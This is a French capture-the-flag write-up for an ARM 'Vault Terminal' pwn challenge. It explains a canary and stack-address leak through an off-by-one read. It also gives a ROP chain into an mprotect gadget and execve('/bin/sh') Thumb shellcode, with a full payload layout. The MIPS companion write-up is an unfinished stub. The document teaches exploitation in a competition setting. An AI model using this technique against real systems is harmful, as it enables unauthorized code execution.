# PWN#Alpha — Vault Terminal ARM (mprotect + shellcode empilé)

- **Auteur :** lyons
- **Cible :** `<HOST>:<PORT>` (ELF ARM 32-bit armhf/EABI5, PIE, lié dynamiquement, stripped)
- **Catégorie :** pwn
- **Flag :** `CTF{REDACTED}`
- **Fichiers fournis :** binaire `vault` (ELF ARM)

## Cadre

Troisième compilation du même source « Vault Terminal », cette fois en ARM/Thumb-2, lié dynamiquement et stripped. À l'instar de PWN#Beta (MIPS), **la section `.data` du binaire téléchargé a été razée exprès**, si bien qu'un segfault survient dans son stub d'entrée obfusqué avant d'atteindre `main`.

Le stub d'entrée (`e_entry = 0x9e1`, Thumb) décode un saut par XOR, la clé étant tirée d'un pointeur `.data` relocalisé (`R_ARM_RELATIVE`) combiné par XOR à une constante figée (`0x426f6772` — identique à la constante du trampoline MIPS de PWN#Beta, preuve d'un packer commun). Dans la copie distribuée, le mot `.data` requis est **ramené à zéro** — crash instantané.

## Recensement

L'analyse statique (capstone, en mode Thumb) du court `.text` applicatif (`0x484` octets) se révèle suffisante :

- `vuln` @ `0x89a` : frame `sub sp,#0x48` ; tampon à `r7+4` ; canari sauvegardé/contrôlé à `r7+0x44` (**offset tampon 0x40 = 64**, convention partagée par chaque architecture de la série) ; r7/LR posés aux **offsets tampon 68/72**.
- `read(0, buf, 0x41)` pour le nom (65 octets — overflow d'1 octet dans le canari) ; `read(0, buf, 0x96)` pour le message (150 octets — écrase très au-delà du LR).
- Imports : `printf, read, puts, setvbuf, __stack_chk_fail, abort` — **aucun `system`**.
- Passer tout le `.text` au peigne des gadgets : **pas un seul `pop {r0-r3, ...}`** — la primitive habituelle pour garnir les arguments d'un appel libc est absente de ce binaire minimal stripped.

## Le gadget mprotect-shellcode recyclable

Une seconde strate d'obfuscation (`0x988`–`0x9de`) déchiffre à l'XOR un blob de 36 octets puis enchaîne mprotect + saut. La **fin** de ce stub se reprend telle quelle :

```
0x9c2: mov  r0, r3
0x9c4: movw r1, #0xf000
0x9c8: movt r1, #0xffff        ; r1 = 0xfffff000
0x9cc: ands r0, r1              ; r0 = page_align_down(r3)
0x9ce: movs r1, #1
0x9d0: lsls r1, r1, #0xc        ; r1 = 0x1000
0x9d2: movs r2, #7              ; PROT_READ|WRITE|EXEC
0x9d4: movw r7, #0x7d           ; SYS_mprotect = 125
0x9d8: svc  #0
0x9da: add.w r3, r3, #1         ; set Thumb bit
0x9de: bx   r3
```

Se poser ici avec `r3` = une adresse pointant dans le tampon rend la page entière RWX, puis l'exécution rebondit dans le tampon (`r3+1`). Le maillon manquant : un `pop {r3, pc}` à `0x676`.

## Fuite : canari + adresse de pile figée, sans ASLR

Toujours la même recette `read(0,buf,0x41)` dans un tampon de 64 octets, sans NUL, avec un `%s` qui traîne : il faut pousser **exactement 65 octets, sans retour à la ligne**. L'écho livre : les octets 1-3 du canari, puis l'ancien `r7` sauvegardé (offset tampon 68) = `R1_main`, le pointeur de pile avec lequel `vuln` a été appelé, puis les 2 premiers octets du LR sauvegardé avant qu'un `0x00` ne coupe.

La valeur du r7 sauvegardé est **identique d'une connexion TCP indépendante à l'autre**, ce qui confirme le comportement par défaut de qemu-user (aucun ASLR).

`BUFFER_ADDR = leaked_r7 - 0x4c` (déduit du push/sub/add de vuln).

## Payload (tampon du message, 84 octets)

```
[0:28)   Shellcode Thumb : mov r0,pc; add r0,#0x10; mov r1,#0; mov r2,#0;
         mov r7,#11 (execve); svc #0;  puis b"/bin/sh\x00"
[28:64)  padding
[64:68)  p32(canary_fuite)
[68:72)  padding (ancien r7)
[72:76)  p32(0x400676 | 1)        # pop {r3, pc}
[76:80)  p32(BUFFER_ADDR)         # -> r3  (pointe sur le shellcode en offset 0)
[80:84)  p32(0x4009c2 | 1)        # -> pc  (gadget mprotect-tail)
```

`PIE_BASE = 0x400000`, confirmé au moyen d'une trace qemu-arm locale.

Le flux : `vuln` rebondit vers `pop{r3,pc}` qui charge `r3=BUFFER_ADDR` puis file au gadget mprotect, lequel passe la page en RWX ; `bx r3+1` plonge alors dans le shellcode qui lance `execve("/bin/sh",0,0)`.

## Issue

```
CTF{REDACTED}
```

Flag prélevé dans `/flag/flag.txt` une fois le shell posé sur le socket.

## Écueils traversés

- **Pas de target ARM dans objdump** sur cette machine — recourir à `capstone` (`CS_ARCH_ARM`, `CS_MODE_THUMB`, `skipdata=True`) ; les stubs PLT restent en mode ARM (non-Thumb) quand bien même l'application est Thumb.
- **Le stub d'entrée XOR crashe avant main** dans le binaire téléchargé — rediriger `e_entry` vers `main` (`0x945`) uniquement pour les essais locaux.
- **Le déchiffrement des chaînes casse dans la copie patchée** — purement cosmétique : les offsets comme la mécanique de l'overflow demeurent intacts.

---

# PWN#Beta — Vault Terminal MIPS

- **Auteur :** lyons
- **Cible :** `<HOST>:<PORT>` (ELF MIPS 32-bit)
- **Catégorie :** pwn
- **Flag :** `CTF{REDACTED}`

> *Write-up détaillé à compléter. Les deux challenges relèvent de la même famille « Vault Terminal », avec fuite de canari par off-by-one et ROP ajusté à l'architecture MIPS.*

## Cadre

<!-- TODO: Ajouter le contexte MIPS (big-endian, stripped, meme packer 0x426f6772) -->

## Recensement

<!-- TODO: Decrire la structure vuln MIPS, gadgets disponibles -->

## Stratégie

<!-- TODO: Documenter la chaine ROP MIPS -->

## Payload

<!-- TODO: Ajouter le layout du payload MIPS -->

## Issue

```
CTF{REDACTED}
```

## Écueils traversés

<!-- TODO: Lister les difficultes specifiques a MIPS -->

---

*Write-ups par **lyons** — BUG|PWN CTF.*
